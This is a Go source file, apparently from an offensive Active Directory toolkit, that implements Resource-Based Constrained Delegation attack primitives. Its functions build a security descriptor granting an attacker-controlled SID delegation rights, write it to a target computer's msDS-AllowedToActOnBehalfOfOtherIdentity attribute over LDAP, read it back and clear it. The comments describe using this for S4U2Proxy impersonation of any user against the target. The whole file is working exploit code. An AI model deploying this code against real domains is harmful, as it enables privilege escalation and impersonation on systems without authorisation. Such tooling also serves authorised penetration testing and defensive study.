package ldap

import (
	"encoding/binary"
	"fmt"
	"strings"

	"github.com/TheManticoreProject/winacl/securitydescriptor"
	"github.com/TheManticoreProject/winacl/sid"
)

// Resource-Based Constrained Delegation (RBCD) write primitives.
//
// RBCD is configured by the msDS-AllowedToActOnBehalfOfOtherIdentity attribute
// on the *resource* (target) computer object. The attribute holds a binary
// Windows security descriptor whose DACL lists the principals allowed to invoke
// S4U2Proxy against that resource on behalf of arbitrary users. The descriptor
// written by delegation tooling is, in SDDL terms:
//
//	O:BAD:(A;;FA;;;<attacker-SID>)
//
// i.e. owner = BUILTIN\Administrators (BA) and a single Allow ACE granting the
// specific full-control mask (0x000F01FF) to the attacker-controlled account's
// SID. Once this is in place, the attacker account (which must itself have an
// SPN) can run S4U2Self -> S4U2Proxy through the target to obtain a service
// ticket to the target as any user (see KerberosClient.S4U2Self / S4U2Proxy).
//
// AttackerSIDs typically has one entry; multiple SIDs are supported by emitting
// one Allow ACE per SID.

// RBCDAttribute is the LDAP attribute that stores the RBCD security descriptor.
const RBCDAttribute = "msDS-AllowedToActOnBehalfOfOtherIdentity"

// RBCD descriptor constants. The descriptor is O:BAD:(A;;<mask>;;;<SID>) with one
// Allow ACE per SID, but it must be built with the exact rights and ACL revision
// the Windows KDC honours when it evaluates the attribute for S4U2Proxy:
//
//   - the ACE access mask is the specific full-control set 0x000F01FF, NOT the
//     generic GENERIC_ALL (0x10000000): the KDC's access check does not expand
//     generic rights here, so a GA ACE is silently ignored and delegation is
//     denied with KDC_ERR_BADOPTION.
//   - the DACL uses ACL_REVISION_DS (4), matching what AD stores for this
//     directory-service security descriptor.
const (
	rbcdAceAccessMask   = 0x000F01FF // specific full control (Windows/RBCD standard)
	aclRevisionDS       = 4          // ACL_REVISION_DS
	seSelfRelative      = 0x8000     // SE_SELF_RELATIVE
	seDaclPresent       = 0x0004     // SE_DACL_PRESENT
	aceTypeAllowed      = 0x00       // ACCESS_ALLOWED_ACE_TYPE
	sdHeaderLen         = 20         // fixed self-relative SD header length
	builtinAdminsSIDStr = "S-1-5-32-544"
)

// BuildRBCDDescriptor builds the binary security descriptor for
// msDS-AllowedToActOnBehalfOfOtherIdentity that allows each of allowedSIDs to act
// on behalf of other identities against the resource. It is the self-relative
// SD O:BAD:(A;;FA;;;<SID>) — owner BUILTIN\Administrators and one ACCESS_ALLOWED
// ACE per SID granting the specific full-control mask 0x000F01FF — built to the
// exact byte layout the Windows KDC accepts (see the RBCD descriptor constants).
//
// Each SID must be a valid string SID (e.g. "S-1-5-21-...-1123"). It returns the
// marshaled descriptor bytes ready to be written to the attribute.
func BuildRBCDDescriptor(allowedSIDs ...string) ([]byte, error) {
	if len(allowedSIDs) == 0 {
		return nil, fmt.Errorf("rbcd: at least one allowed SID is required")
	}

	owner := &sid.SID{}
	if err := owner.FromString(builtinAdminsSIDStr); err != nil {
		return nil, fmt.Errorf("rbcd: build owner SID: %w", err)
	}
	ownerBytes, err := owner.Marshal()
	if err != nil {
		return nil, fmt.Errorf("rbcd: marshal owner SID: %w", err)
	}

	// Build the DACL: one ACCESS_ALLOWED_ACE per allowed SID.
	var aces []byte
	for _, s := range allowedSIDs {
		parsed := &sid.SID{}
		if err := parsed.FromString(strings.TrimSpace(s)); err != nil {
			return nil, fmt.Errorf("rbcd: invalid SID %q: %w", s, err)
		}
		sidBytes, err := parsed.Marshal()
		if err != nil {
			return nil, fmt.Errorf("rbcd: marshal SID %q: %w", s, err)
		}
		aceSize := 8 + len(sidBytes) // header(4) + mask(4) + SID
		ace := make([]byte, 8, aceSize)
		ace[0] = aceTypeAllowed
		ace[1] = 0x00 // ACE flags
		binary.LittleEndian.PutUint16(ace[2:], uint16(aceSize))
		binary.LittleEndian.PutUint32(ace[4:], rbcdAceAccessMask)
		ace = append(ace, sidBytes...)
		aces = append(aces, ace...)
	}

	aclSize := 8 + len(aces) // ACL header(8) + ACEs
	dacl := make([]byte, 8, aclSize)
	dacl[0] = aclRevisionDS
	dacl[1] = 0x00 // Sbz1
	binary.LittleEndian.PutUint16(dacl[2:], uint16(aclSize))
	binary.LittleEndian.PutUint16(dacl[4:], uint16(len(allowedSIDs))) // AceCount
	binary.LittleEndian.PutUint16(dacl[6:], 0x0000)                   // Sbz2
	dacl = append(dacl, aces...)

	// Assemble the self-relative SD: header | DACL | owner SID.
	offsetDacl := sdHeaderLen
	offsetOwner := sdHeaderLen + len(dacl)
	sd := make([]byte, sdHeaderLen, offsetOwner+len(ownerBytes))
	sd[0] = 0x01                                                        // Revision
	sd[1] = 0x00                                                        // Sbz1
	binary.LittleEndian.PutUint16(sd[2:], seSelfRelative|seDaclPresent) // Control
	binary.LittleEndian.PutUint32(sd[4:], uint32(offsetOwner))          // OffsetOwner
	binary.LittleEndian.PutUint32(sd[8:], 0)                            // OffsetGroup
	binary.LittleEndian.PutUint32(sd[12:], 0)                           // OffsetSacl
	binary.LittleEndian.PutUint32(sd[16:], uint32(offsetDacl))          // OffsetDacl
	sd = append(sd, dacl...)
	sd = append(sd, ownerBytes...)
	return sd, nil
}

// ParseRBCDDescriptor parses a binary msDS-AllowedToActOnBehalfOfOtherIdentity
// descriptor and returns the string SIDs granted access by its DACL. It is the
// inverse of BuildRBCDDescriptor and is used to confirm what a target currently
// allows (or to verify a write).
func ParseRBCDDescriptor(raw []byte) ([]string, error) {
	if len(raw) == 0 {
		return nil, nil
	}
	ntsd := securitydescriptor.NewSecurityDescriptor()
	if _, err := ntsd.Unmarshal(raw); err != nil {
		return nil, fmt.Errorf("rbcd: parse descriptor: %w", err)
	}
	dacl := ntsd.GetDacl()
	if dacl == nil {
		return nil, nil
	}
	sids := make([]string, 0, len(dacl.Entries))
	for i := range dacl.Entries {
		sids = append(sids, dacl.Entries[i].Identity.SID.String())
	}
	return sids, nil
}

// WriteRBCD writes an RBCD security descriptor onto targetComputerDN's
// msDS-AllowedToActOnBehalfOfOtherIdentity, allowing each of allowedSIDs to act
// on behalf of other identities against that computer. It replaces any existing
// value. Pair it with ClearRBCD to restore the target after the attack.
func (ldapSession *Session) WriteRBCD(targetComputerDN string, allowedSIDs ...string) error {
	raw, err := BuildRBCDDescriptor(allowedSIDs...)
	if err != nil {
		return err
	}
	// The attribute is a plain octet string holding an SD; unlike
	// nTSecurityDescriptor it needs no SD-flags control.
	req := NewModifyRequest(targetComputerDN)
	req.Replace(RBCDAttribute, []string{string(raw)})
	if err := ldapSession.Modify(req); err != nil {
		return fmt.Errorf("rbcd: write %s on %q: %w", RBCDAttribute, targetComputerDN, err)
	}
	return nil
}

// ReadRBCD reads targetComputerDN's msDS-AllowedToActOnBehalfOfOtherIdentity and
// returns the raw descriptor bytes and the string SIDs it grants. Both are nil
// when the attribute is not set.
func (ldapSession *Session) ReadRBCD(targetComputerDN string) ([]byte, []string, error) {
	entries, err := ldapSession.QueryBaseObject(targetComputerDN, "(objectClass=*)", []string{RBCDAttribute})
	if err != nil {
		return nil, nil, fmt.Errorf("rbcd: read %s on %q: %w", RBCDAttribute, targetComputerDN, err)
	}
	if len(entries) == 0 {
		return nil, nil, fmt.Errorf("rbcd: no entry returned for %q", targetComputerDN)
	}
	raw := entries[0].GetRawAttributeValue(RBCDAttribute)
	if len(raw) == 0 {
		return nil, nil, nil
	}
	sids, err := ParseRBCDDescriptor(raw)
	if err != nil {
		return raw, nil, err
	}
	return raw, sids, nil
}

// ClearRBCD removes the msDS-AllowedToActOnBehalfOfOtherIdentity attribute from
// targetComputerDN, undoing WriteRBCD and restoring the target's original
// (unset) delegation configuration.
func (ldapSession *Session) ClearRBCD(targetComputerDN string) error {
	if err := ldapSession.FlushAttributeValues(targetComputerDN, RBCDAttribute); err != nil {
		return fmt.Errorf("rbcd: clear %s on %q: %w", RBCDAttribute, targetComputerDN, err)
	}
	return nil
}
